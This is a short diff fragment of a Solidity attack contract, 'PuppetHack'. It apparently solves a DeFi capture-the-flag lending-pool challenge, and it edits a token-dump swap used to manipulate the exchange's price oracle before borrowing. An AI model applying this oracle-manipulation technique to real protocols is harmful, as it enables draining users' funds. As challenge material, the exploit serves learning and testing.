@@ -45,11 +45,11 @@ contract PuppetHack {
     function attack() public {
         token.approve(address(exchange), player_initial_tokenBalance);
         // exchange.tokenToEthSwapInput(player_initial_tokenBalance, 1, block.timestamp + 5000);
-        exchange.tokenToEthSwapInput(
-            player_initial_tokenBalance,
-            1,
-            9999999999
-        );
+        // exchange.tokenToEthSwapInput(
+        //     player_initial_tokenBalance - 1,
+        //     1,
+        //     block.timestamp + 5000
+        // );
         uint256 deposit = pool.calculateDepositRequired(
             player_initial_tokenBalance
         );
